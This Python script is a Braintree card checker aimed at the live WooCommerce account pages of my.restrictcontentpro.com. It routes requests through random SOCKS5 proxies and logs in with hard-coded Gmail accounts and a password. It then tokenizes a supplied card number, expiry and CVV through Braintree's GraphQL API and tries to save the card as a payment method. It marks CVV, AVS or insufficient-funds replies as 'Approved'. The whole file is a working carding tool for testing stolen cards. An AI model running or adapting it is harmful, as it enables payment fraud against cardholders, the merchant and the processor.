import base64
import random
import secrets
import uuid
import names
import time
from requests import Session
from dataclasses import dataclass
from proxys.proxys import get_random_proxy  # Importar la función de proxy

@dataclass
class ConfigsPAge:
    def ResponseHtml(self, response: str = None):
        if 'avs_and_cvv' in response:
            return 'Approved! ✅', response
        elif 'cvv: Gateway Rejected: cvv' in response:
            return 'Approved! ✅', response
        elif 'Insufficient Funds' in response:
            return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response:
            return 'Approved! ✅', response
        elif 'CVV.' in response:
            return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response:
            return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response:
            return 'Approved! ✅', response
        elif 'Nice! New payment method added' in response:
            return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response:
            return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response:
            return 'Approved! ✅', response
        elif 'Duplicate card exists in the vault.' in response:
            return 'Approved! ✅', '1000: Approved'
        else:
            return 'Declined! ❌', response

    def SaveResponseHhml(self, response: str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    def Ccs(self, cards: str = None):
        if '|' in cards:
            return cards.split('|')
        elif ':' in cards:
            return cards.split(':')
        elif ',' in cards:
            return cards.split(',')
        elif '-' in cards:
            return cards.split('-')
        return cards

    @classmethod
    def QueryText(self, data: str = None, chainOne: str = None, chainTwo: str = None):
        try:
            uophs = data[data.index(chainOne) + len(chainOne):data.index(chainTwo, data.index(chainOne) + len(chainOne))]
            return uophs
        except:
            return 'value not found'

    @classmethod
    def RandomName(self, dato: str = None):
        if dato == 'username':
            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            return username
        elif dato == 'email':
            email = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            return email
        elif dato == 'password':
            password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
            return password
        elif dato == 'numero':
            number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return number
        else:
            return 'valores incorrectos: >>> ConfigsPAge().RandomName("username")'

    @classmethod
    def DecodeBear(self, dato: str = None):
        token_encoding = base64.b64decode(dato).decode('utf-8')
        bear_end = ConfigsPAge().QueryText(token_encoding, '"authorizationFingerprint":"', '","')
        return bear_end

class BraintreeBS:
    def main(self, card):
        try:
            self.session = Session()
            # Usar proxy aleatorio desde proxys/proxy.py
            proxies = get_random_proxy()  # Obtener un proxy SOCKS5 aleatorio
            self.session.proxies.update(proxies)
            print(f"DEBUG: Usando proxy SOCKS5 - {proxies['http']}")  # Log de depuración para verificar proxy

            user = [
                'yuhiro891@gmail.com', 'y.uhiro891@gmail.com', 'j.uanchkkm@gmail.com',
                'juanxhfc@gmail.com', 'yu.hiro891@gmail.com', 'yuh.iro891@gmail.com',
                'yuhi.ro891@gmail.com', 'hfcfamx@gmail.com', 'h.fcfamx@gmail.com'
            ]
            usernames = random.choice(user)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            }
            r1 = self.session.get('https://my.restrictcontentpro.com/my-account/', headers=headers)
            nonce_login = ConfigsPAge().QueryText(r1.text, 'name="woocommerce-login-nonce" value="', '"')

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://my.restrictcontentpro.com',
                'priority': 'u=0, i',
                'referer': 'https://my.restrictcontentpro.com/my-account/',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            }
            data = {
                'username': usernames,
                'password': 'MrSalchichapenepequeño10c@',
                'woocommerce-login-nonce': nonce_login,
                '_wp_http_referer': '/my-account/',
                'login': 'Log in',
            }
            response = self.session.post('https://my.restrictcontentpro.com/my-account/', headers=headers, data=data)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'priority': 'u=0, i',
                'referer': 'https://my.restrictcontentpro.com/my-account/payment-methods/',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            }
            r2 = self.session.get('https://my.restrictcontentpro.com/my-account/add-payment-method/', headers=headers)
            payment_nonce = ConfigsPAge().QueryText(r2.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            client_token_nonce = ConfigsPAge().QueryText(r2.text, '"client_token_nonce":"', '"')

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://my.restrictcontentpro.com',
                'priority': 'u=1, i',
                'referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': client_token_nonce,
            }
            r3 = self.session.post('https://my.restrictcontentpro.com/wp/wp-admin/admin-ajax.php', headers=headers, data=data)
            data_J = r3.json()['data']
            client_eyj = ConfigsPAge().DecodeBear(data_J)
            session_client_id = ConfigsPAge().SessionId()
            ccs = ConfigsPAge().Ccs(card)

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'authorization': f'Bearer {client_eyj}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'priority': 'u=1, i',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            }
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': session_client_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': ccs[0],
                            'expirationMonth': ccs[1],
                            'expirationYear': ccs[2],
                            'cvv': ccs[3],
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            r4 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            token_card = ConfigsPAge().QueryText(r4.text, '"token":"', '"')

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://my.restrictcontentpro.com',
                'priority': 'u=0, i',
                'referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            }
            correlation_id = secrets.token_hex(16)
            data = [
                ('payment_method', 'braintree_credit_card'),
                ('wc-braintree-credit-card-card-type', 'visa'),
                ('wc-braintree-credit-card-3d-secure-enabled', ''),
                ('wc-braintree-credit-card-3d-secure-verified', ''),
                ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
                ('wc_braintree_credit_card_payment_nonce', token_card),
                ('wc_braintree_device_data', f'{{"correlation_id":"{correlation_id}"}}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
                ('wc_braintree_paypal_payment_nonce', ''),
                ('wc_braintree_device_data', f'{{"correlation_id":"{correlation_id}"}}'),
                ('wc-braintree-paypal-context', 'shortcode'),
                ('wc_braintree_paypal_amount', '0.00'),
                ('wc_braintree_paypal_currency', 'USD'),
                ('wc_braintree_paypal_locale', 'en_us'),
                ('wc-braintree-paypal-tokenize-payment-method', 'true'),
                ('woocommerce-add-payment-method-nonce', payment_nonce),
                ('_wp_http_referer', '/my-account/add-payment-method/'),
                ('woocommerce_add_payment_method', '1'),
            ]
            avs = self.session.post('https://my.restrictcontentpro.com/my-account/add-payment-method/', headers=headers, data=data)
            self.session.close()

            if 'Nice! New payment method' in avs.text:
                return 'Approved! ✅', '1000: Approved'
            elif "81724: Duplicate card exists in the vault." in avs.text:
                return 'Approved! ✅', '1000: Approved'

            error = ConfigsPAge().QueryText(avs.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
            if len(error) > 1 and error[1] == '\n\t\t\t\t\t':
                return 'Approved! ✅', '1000: Approved'
            elif len(error) > 1 and 'Status code' in error[1]:
                return ConfigsPAge().ResponseHtml(error[1].split('Status code ')[1].strip())
            else:
                return 'Declined! ❌', 'Unknown error'

        except Exception as e:
            if hasattr(self, 'session'):
                self.session.close()
            return 'Declined! ❌', f'Declined - Call Issue: {str(e)}'